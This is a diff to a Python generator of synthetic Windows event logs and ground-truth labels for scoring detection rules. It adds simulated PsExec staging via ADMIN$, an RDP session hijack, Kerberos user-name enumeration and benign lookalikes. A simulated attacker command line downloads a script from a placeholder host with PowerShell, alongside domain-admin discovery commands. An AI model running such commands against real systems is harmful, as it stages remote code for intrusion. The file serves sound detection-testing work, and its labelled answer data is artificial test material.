@@ -34,7 +34,7 @@ Incidents (each event the specs/windows_rules.md rule names should find):
   W2 Jul 22  RDP brute force from the internet against RDS01's administrator, 800 tries,
              no success (4625 on RDS01)
   W3 Jul-Sep low-and-slow guessing on RDS01 from rotating internet addresses, 3 a day
-             (a known gap: B5 is not in story 5a - expected to be missed, and said so)
+             (B5 - no per-source count sees it; WIN-BRUTE-4's site-wide CUSUM, story 5d)
   W4 Aug 3   phishing on WS023: Outlook -> Word -> PowerShell -> updater.exe, which then
              beacons to 203.0.113.77:443 every ~5 minutes until Sep 20 (Sysmon 1 / 11 / 3)
   W5 Aug 10  Kerberoasting from WS023: RC4 tickets for 14 service accounts in 90 s (4769)
@@ -46,7 +46,12 @@ Incidents (each event the specs/windows_rules.md rule names should find):
              minutes, two or three tries each, no success (4625 on RDS01)
   W8 Sep 2   pass-the-hash as adm.it from WS023 to FS01, SQL01 and DC01 (NTLM network
              logons, no Kerberos for adm.it from WS023), then PsExec-style service on SQL01
-             (4697 in that logon session, services.exe -> PSEXESVC.exe -> cmd.exe)
+             (4697 in that logon session, services.exe -> PSEXESVC.exe -> cmd.exe), after
+             opening ADMIN$ and writing PSEXESVC.exe into it (5140 / 5145)
+  W10 Sep 9  adm.it's RDP session on RDS01, disconnected at the end of the day, reconnected at
+             night from an outside address, then commands (4779, 4778 RDP-Tcp#, 4688)
+  W11 Sep 15 Kerberos user-name enumeration from the guest-network device: a TGT asked for 200
+             invented names (4768 0x6 on DC01)
 
 Nothing here comes from a real customer; the names, the domain and every address are
 invented (192.0.2.0/24, 198.51.100.0/24 and 203.0.113.0/24 are documentation ranges).
@@ -71,7 +76,8 @@ SYS_PROVIDER = ("Microsoft-Windows-Sysmon", "{5770385F-C22A-43E0-BF4C-06F5698FFB
 SYS_CHANNEL = "Microsoft-Windows-Sysmon/Operational"
 # Task category of each Security event (its Microsoft page), and the keywords of success / failure.
 TASK = {4624: 12544, 4625: 12544, 4672: 12548, 4688: 13312, 4697: 12289, 4698: 12804,
-        4740: 13824, 4768: 14339, 4769: 14337, 4771: 14339, 4776: 14336}
+        4740: 13824, 4768: 14339, 4769: 14337, 4771: 14339, 4776: 14336, 4778: 12551, 4779: 12551,
+        5140: 12808, 5145: 12811}
 OK_KW, FAIL_KW = "0x8020000000000000", "0x8010000000000000"
 SYSMON_TASK = {1: 1, 3: 3, 10: 10, 11: 11}
 
@@ -137,6 +143,9 @@ class Host:
 class Gen:
     def __init__(self, seed: int):
         self.rng = random.Random(seed)
+        # Story 5d's events draw from their own generator, so the quarter 5a-5c were scored on
+        # stays the same event for event.
+        self.rng5 = random.Random(seed + 5)
         self.events: list[tuple] = []     # (ts, host, channel, event_id, data, failure, tag)
         self.hosts = {n: Host(n, ip, self.rng) for n, ip in SERVERS.items()}
         self.users = self._users()
@@ -339,6 +348,29 @@ class Gen:
             ("SubjectLogonId", lid), ("ServiceName", name), ("ServiceFileName", path),
             ("ServiceType", "0x10"), ("ServiceStartType", "3"), ("ServiceAccount", "LocalSystem")], tag)
 
+    def share_access(self, ts, host, user, lid, src_ip, share, local, tag=None):
+        """5140: the session's first access to a share (its page: "once per session")."""
+        self.sec(ts, host, 5140, [
+            ("SubjectUserSid", self.user_sid(user)), ("SubjectUserName", user), ("SubjectDomainName", NETBIOS),
+            ("SubjectLogonId", lid), ("ObjectType", "File"), ("IpAddress", src_ip),
+            ("IpPort", str(self.rng5.randrange(49152, 65535))), ("ShareName", "\\\\*\\" + share),
+            ("ShareLocalPath", "\\??\\" + local), ("AccessMask", "0x1"), ("AccessList", "%%4416")], tag)
+
+    def share_write(self, ts, host, user, lid, src_ip, share, local, name, tag=None):
+        """5145: a file under the share checked for WriteData / AddFile (0x2)."""
+        self.sec(ts, host, 5145, [
+            ("SubjectUserSid", self.user_sid(user)), ("SubjectUserName", user), ("SubjectDomainName", NETBIOS),
+            ("SubjectLogonId", lid), ("ObjectType", "File"), ("IpAddress", src_ip),
+            ("IpPort", str(self.rng5.randrange(49152, 65535))), ("ShareName", "\\\\*\\" + share),
+            ("ShareLocalPath", "\\??\\" + local), ("RelativeTargetName", name), ("AccessMask", "0x2"),
+            ("AccessList", "%%4417"), ("AccessReason", "-")], tag)
+
+    def rdp_session(self, ts, host, eid, user, lid, client, client_ip, n, tag=None):
+        """4778 (reconnected) / 4779 (disconnected) for RDP session RDP-Tcp#n."""
+        self.sec(ts, host, eid, [
+            ("AccountName", user), ("AccountDomain", NETBIOS), ("LogonID", lid),
+            ("SessionName", f"RDP-Tcp#{n}"), ("ClientName", client), ("ClientAddress", client_ip)], tag)
+
     def task(self, ts, host, name, tag=None):
         self.sec(ts, host, 4698, [
             ("SubjectUserSid", "S-1-5-18"), ("SubjectUserName", self.hosts[host].account),
@@ -537,7 +569,7 @@ class Gen:
             for _ in range(3):
                 ip = f"{self.rng.choice(SLOW_NETS)}.{self.rng.randrange(2, 250)}"
                 self.logon_fail(self.at(day, self.rng.uniform(0, 24)), "RDS01", self.rng.choice(targets), 3, ip,
-                                "-", tag=("attack", "W3", "low-and-slow guessing (B5, not in story 5a)",
+                                "-", tag=("attack", "W3", "low-and-slow guessing (B5)",
                                           T["guess"]))
 
     def w9_distributed(self):
@@ -639,6 +671,11 @@ class Gen:
                                           "NTLM", tag, admin=True)
         t += timedelta(minutes=3)
         svc = ("attack", "W8", "PsExec-style service in the stolen session", T["psexec"])
+        copy = ("attack", "W8", "PSEXESVC.exe copied to ADMIN$", T["smb"])
+        self.share_access(t - timedelta(seconds=4), "SQL01", "adm.it", sessions["SQL01"], u["ip"], "ADMIN$",
+                          r"C:\Windows", copy)
+        self.share_write(t - timedelta(seconds=3), "SQL01", "adm.it", sessions["SQL01"], u["ip"], "ADMIN$",
+                         r"C:\Windows", "PSEXESVC.exe", copy)
         self.service(t, "SQL01", "adm.it", sessions["SQL01"], "PSEXESVC", r"%SystemRoot%\PSEXESVC.exe", svc)
         services = {"image": r"C:\Windows\System32\services.exe", "pid": 680, "guid": self.guid("SQL01"),
                     "cmd": r"C:\Windows\system32\services.exe", "user": "NT AUTHORITY\\SYSTEM"}
@@ -651,6 +688,95 @@ class Gen:
                      r"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE",
                      'sqlcmd -S . -Q "BACKUP DATABASE ERP TO DISK=\'C:\\Users\\Public\\erp.bak\'"', cmd, svc,
                      elevated=True)
+
+    # ----------------------------------------------------------- story 5d
+    def w10_rdp_reconnect(self):
+        """adm.it's afternoon RDP session on RDS01 (a habit) is left disconnected and taken over at night
+        from an outside address: the reconnect carries the session's own logon id, and so do its commands."""
+        it_ws = self.hosts["WS003"]
+        day = datetime(2026, 9, 9, tzinfo=TZ)
+        t = day + timedelta(hours=16, minutes=40, seconds=12)
+        habit = ("lookalike", "-", "administrator on RDP", T["rdp"])
+        self.tgt(t - timedelta(seconds=3), "adm.it", it_ws.ip)
+        lid = self.logon(t, "RDS01", "adm.it", 10, it_ws.ip, "RDS01", "Negotiate", habit, admin=True)
+        shell = self.process(t + timedelta(seconds=5), "RDS01", "adm.it", lid, r"C:\Windows\System32\rdpclip.exe",
+                             "rdpclip", tag=habit)
+        tag = ("attack", "W10", "RDP session taken over from outside", T["rdp"])
+        self.rdp_session(day + timedelta(hours=17, minutes=35, seconds=40), "RDS01", 4779, "adm.it", lid,
+                         "WS003", it_ws.ip, 3, tag)
+        t = day + timedelta(hours=23, minutes=48, seconds=3)
+        self.rdp_session(t, "RDS01", 4778, "adm.it", lid, "DESKTOP-7Q2M1LX", "198.51.100.23", 3, tag)
+        self.logon(t + timedelta(milliseconds=600), "RDS01", "adm.it", 7, "198.51.100.23", "RDS01", "Negotiate", tag)
+        cmd = self.process(t + timedelta(seconds=30), "RDS01", "adm.it", lid, r"C:\Windows\System32\cmd.exe",
+                           '"C:\\Windows\\system32\\cmd.exe"', shell, tag, elevated=True)
+        for i, line in enumerate(["whoami /priv", "net user /domain", "net group \"Domain Admins\" /domain"]):
+            exe = line.split()[0]
+            self.process(t + timedelta(seconds=50 + 20 * i), "RDS01", "adm.it", lid, rf"C:\Windows\System32\{exe}.exe",
+                         line, cmd, tag, elevated=True)
+        self.process(t + timedelta(minutes=3), "RDS01", "adm.it", lid,
+                     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                     "powershell.exe -nop -c \"iwr http://198.51.100.23/r.ps1 -OutFile C:\\Users\\Public\\r.ps1\"",
+                     cmd, tag, elevated=True)
+
+    def reconnect_habit(self):
+        """adm.it leaves an RDP session to RDS01 over lunch and reconnects from WS003 - on many days."""
+        it_ws = self.hosts["WS003"]
+        tag = ("lookalike", "-", "administrator reconnects to RDP", T["rdp"])
+        days = [d for d in range(DAYS) if (START + timedelta(days=d)).weekday() < 5]
+        for d in sorted(self.rng.sample(days, 15)):
+            day = START + timedelta(days=d)
+            t = self.at(day, 10, 0.5)
+            self.tgt(t - timedelta(seconds=3), "adm.it", it_ws.ip)
+            lid = self.logon(t, "RDS01", "adm.it", 10, it_ws.ip, "RDS01", "Negotiate", tag, admin=True)
+            shell = self.process(t + timedelta(seconds=5), "RDS01", "adm.it", lid,
+                                 r"C:\Windows\System32\rdpclip.exe", "rdpclip", tag=tag)
+            n = self.rng.randrange(2, 9)
+            self.rdp_session(self.at(day, 12, 0.2), "RDS01", 4779, "adm.it", lid, "WS003", it_ws.ip, n, tag)
+            back = self.at(day, 13.5, 0.2)
+            self.rdp_session(back, "RDS01", 4778, "adm.it", lid, "WS003", it_ws.ip, n, tag)
+            self.process(back + timedelta(minutes=2), "RDS01", "adm.it", lid,
+                         r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                         "powershell.exe -NoProfile Get-Service | Where Status -eq Stopped", shell, tag, elevated=True)
+
+    def w11_kerberos_enum(self):
+        """A TGT asked for 200 invented names from the guest-network device: 4768 0x6 for each."""
+        t = datetime(2026, 9, 15, 10, 5, 2, tzinfo=TZ)
+        names, first = [], ["john", "mary", "david", "anna", "peter", "linda", "mark", "susan", "paul", "karen",
+                            "tom", "nancy", "alex", "lisa", "chris", "kate", "mike", "sara", "ben", "emma"]
+        for f in first:
+            for form in (f, f"{f}.a", f"{f}.b", f"{f}.s", f"{f[0]}smith", f"{f[0]}jones", f"{f}1", f"{f}.k",
+                         f"{f}.t", f"adm.{f}"):
+                if form.lower() not in self.sid:
+                    names.append(form)
+        tag = ("attack", "W11", "Kerberos user-name enumeration", T["disc"])
+        for name in names[:200]:
+            t += timedelta(milliseconds=self.rng.randrange(40, 300))
+            self.tgt(t, name, GUEST_DEVICE, status="0x6", tag=tag)
+
+    def mistyped_names(self):
+        """Now and then a user types their user name wrong once, then right (4768 0x6, then 0x0)."""
+        tag = ("lookalike", "-", "mistyped user name", T["guess"])
+        for _ in range(8):
+            u = self.rng.choice(self.users)
+            day = START + timedelta(days=self.rng.randrange(DAYS))
+            t = self.at(day, 8.3, 0.3)
+            self.tgt(t, u["login"][:-1], u["ip"], status="0x6", tag=tag)
+            self.tgt(t + timedelta(seconds=self.rng.uniform(5, 20)), u["login"], u["ip"])
+
+    def patch_rollout(self):
+        """Sep 22: IT copies a patch to each server through C$ and runs it as a service."""
+        it_ws = self.hosts["WS003"]
+        day = datetime(2026, 9, 22, tzinfo=TZ)
+        tag = ("btp", "-", "patch pushed through C$ and run as a service", T["psexec"])
+        for i, target in enumerate(["FS01", "SQL01", "RDS01"]):
+            ts = self.at(day, 19 + i * 0.1)
+            self.tgs(ts - timedelta(seconds=1), "adm.it", f"{target}$", it_ws.ip)
+            lid = self.logon(ts, target, "adm.it", 3, it_ws.ip, tag=tag, admin=True)
+            self.share_access(ts + timedelta(seconds=1), target, "adm.it", lid, it_ws.ip, "C$", "C:\\", tag)
+            self.share_write(ts + timedelta(seconds=2), target, "adm.it", lid, it_ws.ip, "C$", "C:\\",
+                             r"Windows\Temp\kb5043145.exe", tag)
+            self.service(ts + timedelta(seconds=6), target, "adm.it", lid, "PatchSvc",
+                         r"C:\Windows\Temp\kb5043145.exe /quiet /norestart", tag)
 
     # ----------------------------------------------------------- the quarter
     def build(self):
@@ -687,6 +813,13 @@ class Gen:
         self.w6_guess_adm_backup()
         self.w7_rdp_and_lsass()
         self.w8_pth_and_psexec()
+        main, self.rng = self.rng, self.rng5
+        self.w10_rdp_reconnect()
+        self.w11_kerberos_enum()
+        self.reconnect_habit()
+        self.mistyped_names()
+        self.patch_rollout()
+        self.rng = main
 
 
 def render(host: Host, channel: str, eid: int, rec: int, ts, data, failure: bool) -> str:
@@ -731,12 +864,15 @@ them as one case. Every event that is not plain work is in `ground_truth.csv` wi
 - DC01's own machine account signs in to DC01 from its address, 127.0.0.1 and ::1 (one account,
   several sources).
 - Users mistype a password (4625 on the workstation + 4771 on DC01, same attempt), then sign in.
+- adm.it leaves an RDP session to RDS01 over lunch and reconnects from WS003 (4779 / 4778), on 15 days.
+- A user types their user name wrong once, then right (4768 0x6, then a TGT).
 
 ## Benign true positives (label `btp` - a finding the analyst closes as benign is right)
 
 - Aug 25-27: `svc_backup`'s password changed, the job on SQL01 kept the old one - a failure every
   15 minutes for two days, then fixed.
 - Aug 12: IT deploys Zabbix Agent 2 to every server as a remote service (PsExec's shape).
+- Sep 22: IT copies a patch to FS01, SQL01 and RDS01 through C$ and runs it as a service.
 """
 
 
